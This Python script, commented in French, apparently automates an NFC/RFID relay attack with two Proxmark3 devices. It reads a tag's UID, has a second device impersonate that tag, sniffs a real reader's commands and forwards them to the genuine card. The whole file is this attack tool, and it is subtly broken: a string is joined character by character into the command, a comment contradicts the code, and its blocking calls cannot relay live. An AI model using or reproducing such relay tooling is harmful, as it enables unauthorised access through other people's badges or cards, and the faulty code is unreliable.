import subprocess
import re
import time

# Configuration des ports (syntaxe -p selon tes indications)
PM3_PATH = "./client/proxmark3.exe"
PORT_MOLE = "COM9"
PORT_PROXY = "COM10"


def pm3_exec_clean(port, command):
    """Lance pm3, récupère la sortie brute et extrait l'hexadécimal."""
    full_cmd = [PM3_PATH, port, "; ".join(command) + "; exit"]
    
    try:
        # Exécution de la commande
        process = subprocess.run(full_cmd, capture_output=True, text=True, timeout=5)
        #juste subprocess.run(full_cmd) dans mes codes qui marchent
        raw_output = process.stdout
        
        # FILTRAGE : On cherche les lignes qui ressemblent à de l'hexadécimal (ex: [4] 90 5a 00)
        # On ignore tout ce qui est texte (bannière, help, etc.)
        hex_lines = re.findall(r'((?:[0-9A-Fa-f]{2}\s+){2,}[0-9A-Fa-f]{2})', raw_output)
        
        if hex_lines:
            # On prend la ligne la plus longue (souvent la réponse la plus complète)
            return hex_lines[-1].replace(" ", "").strip()
        
        return ""
    except Exception as e:
        print(f"Erreur d'exécution : {e}")
        return ""

def main_relay():
    print("[*] Démarrage du relais (Mode filtrage activé)...")

    # 1. Identification du tag
    # On utilise hf 14a info pour cloner l'UID
    print(f"[*] Lecture du tag sur {PORT_MOLE}...")
    res_info = pm3_exec_clean(PORT_MOLE, f"hf 14a info")
    
    # On force une recherche d'UID si l'extraction hex simple échoue
    if not res_info:
        # Fallback : on cherche spécifiquement "UID :" dans le texte brut
        raw = subprocess.run([PM3_PATH, PORT_MOLE, f"hf 14a info"], capture_output=True, text=True).stdout
        uid_match = re.search(r'UID\s*:\s*([A-Fa-f0-9\s]+)', raw)
        if uid_match:
            uid = uid_match.group(1).replace(" ", "").strip()
        else:
            print("[!] Impossible de lire l'UID.")
            return
    else:
        uid = res_info

    print(f"[+] UID détecté : {uid}")

    # 2. Simulation sur le Proxy
    print(f"[*] Lancement de la simulation sur {PORT_PROXY}...")
    pm3_exec_clean(PORT_PROXY, f"hf 14a sim -u {uid}")

    try:
        while True:
            # 3. Sniffing du lecteur original
            # On cherche les commandes du lecteur
            reader_data = pm3_exec_clean(PORT_PROXY, "hf 14a sniff")
            
            if reader_data:
                print(f"[Lecteur] -> {reader_data}")
                
                # 4. Transmission au Mole avec les options de tes captures :
                # -c pour le CRC, -k pour garder le champ actif
                tag_res = pm3_exec_clean(PORT_MOLE, f"hf 14a raw -ck {reader_data}")
                
                if tag_res:
                    print(f"    [Tag] -> {tag_res}")
                    # On renvoie la réponse au lecteur original
                    pm3_exec_clean(PORT_PROXY, f"hf 14a raw {tag_res}")

            time.sleep(0.05)
            
    except KeyboardInterrupt:
        print("\n[*] Arrêt du relais.")

if __name__ == "__main__":
    main_relay()